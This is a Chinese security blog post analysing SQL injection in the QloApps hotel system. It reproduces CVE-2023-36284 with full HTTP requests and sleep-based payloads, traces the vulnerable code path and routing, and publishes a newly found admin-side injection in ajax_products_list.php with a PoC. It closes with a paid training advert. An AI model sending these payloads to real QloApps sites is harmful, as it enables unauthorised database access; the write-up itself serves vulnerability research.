#  【PHP代审】记一次某海外酒店管理系统漏洞复现分析+0day挖掘  
原创 C@ig0  菜狗安全   2025-06-12 00:31  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThblPVAndvyTpQFwq1A0r1dWhvB7eMS9aib6BWewwHCOepINib6su4KMIibw/640?wx_fmt=gif&from=appmsg "")  
  
点击上方蓝字·关注我们  
  
  
免责声明  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbpd3jzvdXXROdjXCddIaUR6icvQfhjUVDAXNPbM4SuibSU8GwCr9t5VvA/640?wx_fmt=gif&from=appmsg "")  
  
  
由于传播、利用本公众号  
菜狗安全  
所提供的信息而造成的任何直接或者间接的后果及损失，均由  
使用者本人负责，公众号  
菜狗安全  
及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，会立即删除并致歉。  
  
文章目录  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/QtaE6uFmibPlPBODMGcLpNt9QBAWypThbpd3jzvdXXROdjXCddIaUR6icvQfhjUVDAXNPbM4SuibSU8GwCr9t5VvA/640?wx_fmt=gif&from=appmsg "")  
  
  
```
前言
漏洞复现(CVE-2023-36284)
漏洞分析
路由分析
0day挖掘
最后
```  
  
  
2sdf2. 请求路由获取未规范化3. 后端路径规范化不一致  
  
前言  
  
工作上遇到的一套系统，看了下是开源的，github 5.7k star 还不错，漏洞点没啥感觉挺简单，路由关系比较有意思，拿来分析下，然后自己随便看了下出了个新的  
  
漏洞复现(  
CVE-2023-36284  
)  
  
项目地址：  
https://github.com/Qloapps/QloApps  
  
CVE参考文章：  
https://flashy-lemonade-192.notion.site/Time-Based-SQL-injection-in-QloApps-1-6-0-be3ed1bdaf784a77b45dc6898a2de17e  
  
环境搭建好后  
  
访问：  
http://ip:port/zh/8-the-hotel-prime?date_from=2025-06-12&date_to=2025-06-14&occupancy%5B0%5D%5Badults%5D=1&occupancy%5B0%5D%5Bchildren%5D=0  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qKmV0PA6j0JYnHib4BnSmFCicdg8dic0BGw4UA4CFcUGjoF4bmqBwppibIZw/640?wx_fmt=other&from=appmsg "")  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qK0VzZm97KoTdJxFezymPEkb9QIpZNUt9Kd0MqDu0SOyh0l06rZtmFHQ/640?wx_fmt=other&from=appmsg "")  
  
构造数据包  
```
GET /zh/quick-order?date_from=2023-06-12%2000:00:00&date_to=2023-06-13%2000:00:00&deleteFromOrderLine=1&id_product=1 HTTP/1.1
Host: hotel:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hotel:8000/zh/8-the-hotel-prime?date_from=2025-06-12&date_to=2025-06-13&occupancy%5B0%5D%5Badults%5D=1&occupancy%5B0%5D%5Bchildren%5D=0
Cookie: install_c2555da24161=0gvcgtkr4d62h60mevr4r5sbum; PrestaShop-982ef6ed83d922bf6ce9ada599a2fd13=def502002e5910f67a1c4bc8b7c6145f1e0ceb6646a8f8bfc07f1ba43bf1c5e9ab92293832ffc2abea19b5c6d0dafde495f90ea107baecddb8fe87afb0c7ae255de3de0030761cb12463245fe564372edcc548cd52b332cf10ddc05ea99d5b8e833a9f6258c2a07b57023c1609a949d2aaec593c4d621bea6d169dbfc5cf45d5f9f4fb8490f23287de72fac69b5940d10a1a20216f105943c78d3762af4009b73a59a86299403420f3b0443455d14a4807df; PrestaShop-daf117f818c8eeecfa2bccccdd849a8c=def5020095fc888abe0091e4fdc03b520f904d84f1b3888a6e3602b2afddfc709d566a5a01bc2959142450af068fe77e678bbdfcd561afed20233aeb795a8936ae3a7af108b2bb8ebd491cdca8ae8455237bb5bfe4757987eb4a4e1693d5bfcab0ab38093c976f1e2ec0285dce1aa9e91ad05c6adaa9ed13846ab0d88ed1b7d88592458483fb7de805b5f9bfb99e1ad565fa43afa6a29622dca6b9f09f6d99f7d434a3a36d3404addbd4a2c9bbd8fb7f19b3d7f4e17573e5b439cc0d3ffa2d7d31cf865f292073dd59cccea55bb3f15f47aecb48560fbf4ce9514e56d04e896218b8fea03fa929b7ba4173e1244a879b353737f4ed390d48a05e20bf08225a501a6ac94f11e2d3051022175a7982a726f126140aebd7e06b71af80608b1b89fe85940627970f4215
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```  
  
payload  
```
Payload:	
	date_from=(select(0)from(select(sleep(5)))v)/*'%2B(select(0)from(select(sleep(4)))v)%2B'"%2B(select(0)from(select(sleep(4)))v)%2B"*/
	date_to=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z
	id_product=(select(0)from(select(sleep(5)))v)
```  
  
原始数据包  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qKAMsYKtia4ln6WcPYKk8q1VPPSN9mEr4ZIraKWXhdyhn2u1Ndnfu8szg/640?wx_fmt=other&from=appmsg "")  
  
id_product 测试POC：  
```
GET /zh/quick-order?date_from=2023-06-12%2000:00:00&date_to=2023-06-13%2000:00:00&deleteFromOrderLine=1&id_product=(select(0)from(select(sleep(5)))v) HTTP/1.1
Host: hotel:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://hotel:8000/zh/8-the-hotel-prime?date_from=2025-06-12&date_to=2025-06-13&occupancy%5B0%5D%5Badults%5D=1&occupancy%5B0%5D%5Bchildren%5D=0
Cookie: install_c2555da24161=0gvcgtkr4d62h60mevr4r5sbum; PrestaShop-982ef6ed83d922bf6ce9ada599a2fd13=def502002e5910f67a1c4bc8b7c6145f1e0ceb6646a8f8bfc07f1ba43bf1c5e9ab92293832ffc2abea19b5c6d0dafde495f90ea107baecddb8fe87afb0c7ae255de3de0030761cb12463245fe564372edcc548cd52b332cf10ddc05ea99d5b8e833a9f6258c2a07b57023c1609a949d2aaec593c4d621bea6d169dbfc5cf45d5f9f4fb8490f23287de72fac69b5940d10a1a20216f105943c78d3762af4009b73a59a86299403420f3b0443455d14a4807df; PrestaShop-daf117f818c8eeecfa2bccccdd849a8c=def5020095fc888abe0091e4fdc03b520f904d84f1b3888a6e3602b2afddfc709d566a5a01bc2959142450af068fe77e678bbdfcd561afed20233aeb795a8936ae3a7af108b2bb8ebd491cdca8ae8455237bb5bfe4757987eb4a4e1693d5bfcab0ab38093c976f1e2ec0285dce1aa9e91ad05c6adaa9ed13846ab0d88ed1b7d88592458483fb7de805b5f9bfb99e1ad565fa43afa6a29622dca6b9f09f6d99f7d434a3a36d3404addbd4a2c9bbd8fb7f19b3d7f4e17573e5b439cc0d3ffa2d7d31cf865f292073dd59cccea55bb3f15f47aecb48560fbf4ce9514e56d04e896218b8fea03fa929b7ba4173e1244a879b353737f4ed390d48a05e20bf08225a501a6ac94f11e2d3051022175a7982a726f126140aebd7e06b71af80608b1b89fe85940627970f4215
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```  
  
成功延时  
  
![image.png](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qKMRks1hK3ThKRXBibYicu3wThficdtOmZJxrpKa5iaSjNLmLe3X6oQ1IIRA/640?wx_fmt=other&from=appmsg "")  
  
date_from和date_to参数也存在注入，相关payload在上面有写，可以自行测试  
  
漏洞分析  
  
漏洞对应方法：  
controllers/front/OrderOpcController.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKrUN1icMNpdb77P36cz2jmKOVsW1NCicd3X1n03YRpvN0ianFrKfnzFXZg/640?wx_fmt=png&from=appmsg "")  
  
在初始化方法里面，无需指定方法  
  
531行开始，这个Tools::  
getValue字面意思是获取参数值的，跟进方法实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKpMK05lg2wdNOfhPnGDpvUAxPVkQD0xAibASPddNKayAM7FxbMJb6icsg/640?wx_fmt=png&from=appmsg "")  
  
通过get或者post获取参数，  
如果值是字符串，先 urlencode 后过滤掉 %00 和 %5C0（防止空字节注入），再 urldecode 并去除反斜杠后返回  
  
返回代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKrUN1icMNpdb77P36cz2jmKOVsW1NCicd3X1n03YRpvN0ianFrKfnzFXZg/640?wx_fmt=png&from=appmsg "")  
  
531行获取deleteFromOrderLine，判断是否为空，不为空获取id_product，date_from，date_to参数并赋值  
  
536把参数带入deleteRoomDataFromOrderLine方法执行，跟进方法实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKwGoddkswibJpd6v9ibdTygoF9b8HgdDpzGYZmX9WXupyibTH2eA6tNjbg/640?wx_fmt=png&from=appmsg "")  
  
这里获取到的值拼接进executeS()方法执行，其实这里就能看出是执行sql语句的了，跟进实现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qK92nUH5u9lr1txFyNjYpZcXQml2yg5jyxVNN1YP609a2CsMqf5T3wkA/640?wx_fmt=png&from=appmsg "")  
  
647行调用  
query($sql)，跟进  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKy5DstALmn5xlxa4uIPnbKGwecdSEC6l4FdLljYpkWlEGBdMun4AawQ/640?wx_fmt=png&from=appmsg "")  
  
426行通过_query执行语句，后面就没必要跟了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKKaXd0IpOKLxnJ9CuHXInu3ZJoW0z10CjNCfYmULmc1Q6CVReDomQ6g/640?wx_fmt=png&from=appmsg "")  
  
两种数据库连接方式的查询实现  
  
那么这里是存在注入的，没问题  
  
按道理来说这里的文件是  
OrderOpcController.php，是  
Controller，调用应该是/  
OrderOpc，或者/index.php?  
Controller=  
OrderOpc(根据其它功能点路由照猫画虎)，但是这里访问不到，接下来分析下触发流程  
  
路由分析  
  
实现我们前端访问的是/quick-order，项目中是没有这个实现方法的，代码中也完全搜索不到，最后通过每部分一点点拼凑大概明白了整体流程  
  
访问127.0.0.1/  
quick-order的时候，会在数据库中查询定义好的路由映射，路由映射表是  
qlo_meta_lang   
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKak4pfTFhDUMUwVhcplcVrhX0AMSSD4zU28ECgZ2oA00M9icJhmCEUeA/640?wx_fmt=png&from=appmsg "")  
  
然后通过对应  
id_meta，查询qlo_meta表中对应的page字段  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qK8GnibtjWU3icRaib8I7w2nL14q1FKxgB4ic1R1CPEdPs3PbAMr07Yuk7CQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKRb6NRUVz7gr0lhbP4ibf43xm01bVsibmLFa12nHMurD3Lcclban474wg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKeCJibvnFAF27FMWBCbLKticLS5BzknjfUtqNc4JRx9DR09jpIkXiaZPvQ/640?wx_fmt=png&from=appmsg "")  
  
映射信息  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKib0eKxKicOpsMAkdeqs9ic4SxFAzyhOMx96QacibEBxcXqkDo4rzU5QZyw/640?wx_fmt=png&from=appmsg "")  
  
$php_self = 'order-opc'：设置当前控制器对应的页面标识符为 'order-opc  
  
流程拼凑起来就是：访问/  
quick-order，数据库中查询到  
order-opc，然后路由映射到OrderOpcControllerCore，实际上对应的是  
OrderOpcController.php文件，  
中间省略了些步骤，但是差不多是这样  
  
代码基础差分析这个还是有点头大，也是第一次见这种路由方式，分析还是花了点时间  
  
0day挖掘  
  
在漏洞分析的时候看了下sql查询实现的方法定义在  
classes/db/Db.php中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKMtiaDh3HRHibZVjw46attVoNPR0wWWLvd3XtPx5vuBhUmlDYtwoG4xZQ/640?wx_fmt=png&from=appmsg "")  
  
这里就挑漏洞分析的查询方法吧  
executeS  
(  
  
全局搜索  
executeS  
(  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKACxz9JibA3c1DZAkoIjPs4Be61zbudoQwRIvVkOdKJz7BicMX6x06dUQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞对应文件：admin/ajax_products_list.php  
  
![image-20250610090834694.8dx4bw46at.webp](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qKWudSibykk3CyanxTgVNDLJEWiaPewBdrylpzzWIrqiaiafEHiaHI5j4RvRg/640?wx_fmt=other&from=appmsg "")  
  
在第 54 行，通过 getValue 接收 packItself 并将其连接到第 76 行的 $sqlWhere  
  
![image-20250610091129653.1vywiktbhk.webp](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qK05cw0qMl2pUYtgMicVFoz89YBgKs7WpmLouspsGdmqVQq1TJw2kNvwA/640?wx_fmt=other&from=appmsg "")  
  
在第 95 行存在注入漏洞，其中 $sqlWhere 被连接成 $sql，在第 97 行中，sql 语句通过 executeS 执行，而没有转义或过滤 packItself 的内容并将其直接连接到语句执行中  
  
  
是后台文件，代码中有鉴权，需要登陆管理员  
  
利用POC：  
```
GET /admin/ajax_products_list.php?packItself=123+OR+(SELECT+1044+FROM+(SELECT(SLEEP(5)))WzOB)&q=123 HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PrestaShop-982ef6ed83d922bf6ce9ada599a2fd13=def502007a7e6ee564892223cd1855ee86633c21947cbd4943de4cda296f6a339652a07adbded5c585452aed503337c2fe48b607f29cece4136a0b714f723aa6d2e1304a0e9ea0ceffbacbdc77c49808e39afcc65441603f4acfc7a96516780ffbc7e22390c691534835c62728d0df5f67cf1a4e9efa77947acb9c0944b9056df5bb0693f37c96294a74ed65d2e7da373ce81a576afb62f4995fce32aabcb0eaff5750c4e2d184fc95c6f324a70b293546b4715945f4e56051cb3a5a79e125267a963e2c23027083c9903e390845d98c64f2606a2cef4477fe45d39ddfbc2f67101131998abea607a90238bb1d912fe6adc27e9cc81ec6a1f8f6b804f3e07115a8eea93168fba4857cbeb0be70b5a91d53cdb177bf4f0664bb9b7abcc9dc4c3b0fa9e537b6761695de3fae4040d9e89b29e3810db5bd641abc939214ed65497f743d83601fcf7fb10c024f500f4ce390a8ed2556220d9c97f7258f3a060e; PrestaShop-daf117f818c8eeecfa2bccccdd849a8c=def50200013b2cf79e5ea48d8c6f8c958fb78be0ef42476ea0616e543279bd87c71dd9f768189f1a97409996bb010782d3e2f10d102fd7fc36d3d20999e752ec492c4d82f13b6312cafda8ea6a48a744dbf5dc204b351cce65446af5df7ecab3ce1492af6704a8f2248b47de09d8c2fbfa35c06405607acd8117e02ba6c43a4cbc895dd49893d2053ca0bd3ead643ccc51000ef7e8e8a4ae60e0fffd8599f3f8618ef344e60464045ba3032fbd18c2af210385b5a41f1fb84477677d75af5316af20fd0a3849e0b3436a0c3241527abc603cba0f0347bde902097ff773bec3e51db5747e56e872e159e2eafca5ac3ec138a6154679fcb9cd5662acb7d8d95489219ef730eb60fe5d16584d3a4d43afdc0c8aad9cf2b0e330a1b40bbf66c1f2a34fe7ddceec3190788ce44da7e9b4716e61ea84562c06204b4ef2e5cc954dbc2e1e954e0d2177b4b095da9359c8037e07f1295d81d36200014ac99a3df7cd67249177cafc86021315c0481a55a072137e4c6cd059c8875f10a15ef51424237fe0de5dde5ecaf3c22ccc0ef638f2b381af0e68b9799d52905bd960afcda3f96fcec2ac57fa199c2b989fef07780d000d2da293956e6976098d02e92df9
```  
  
![image-20250610093151074.3yep6mrwiy.webp](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qKkmN8hvLyOQHsl7x2s5OLhtEgNhicIZnDyWFwqvyWvwh8ILoLkshycIA/640?wx_fmt=other&from=appmsg "")  
  
SQLMAP验证  
  
![image-20250610092807436.4n7yqnffjd.webp](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qKb7GZoicic0CXxXFK4fdkPo5YLZryaoicmkk8cueAADicB9eLO64hodEHYA/640?wx_fmt=other&from=appmsg "")  
  
后台注入对我来说没啥意义，可以水个CVE，学员群里抽了![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Yellowdog.png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKCN92TDuKnicZ5xKCP0ukIqwHKkkicEGZePVay1Pibd1hzjedr1Y6sSuqw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKbYYd7AgNLm9AAFDtVVYJT4lpQOZIwfD0nRVcB5W9uoVia4wX9PJLQww/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/QtaE6uFmibPlUfnum19551Qo72icibicc3qKsFJbF94pqE205crkycXqW07HhfgwuwhMgnzCQf3MnwpUhAZ2348hcQ/640?wx_fmt=png&from=appmsg "")  
  
最后  
  
有其它问题或者对文章内容有疑问的，技术交流也可以加交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPlUfnum19551Qo72icibicc3qKkqDzD45ZmwP7aPaNRLEPzAgs4icuFWV9y8nH2Tu8TJag4jzMrdzicqSA/640?wx_fmt=jpeg&from=appmsg "")  
  
公众号培训广告，有需要可联系(混口饭吃)  
  
[菜狗安全《代码审计》第①期重制版！！！](https://mp.weixin.qq.com/s?__biz=Mzg4MzkwNzI1OQ==&mid=2247486625&idx=1&sn=bc9baf649c63f3a72e17409ca4d0d334&scene=21#wechat_redirect)  
  
  
  
课程介绍视频  
  
菜狗安全《代码审计》第①期培训介绍与答疑  
  
https://www.bilibili.com/video/BV153VWzgEgq  
  
比起公开课内容对小白更友好，讲解更细致，实战案例更新更多  
  
新增JAVA安全一系列内容，现已开课，  
1299  
，  
一次付费包终身！！！  
  
心动不如行动  
  
有需要或者有问题可以加微信，备注“培训”  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/QtaE6uFmibPmyYJicIqNwwpG0Ol64iafibLIpK40gIU9QS43pXcgwSlQdQbibMO1GFofN4Xto13W3yn2FUTJkEpsq8g/640?wx_fmt=jpeg&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
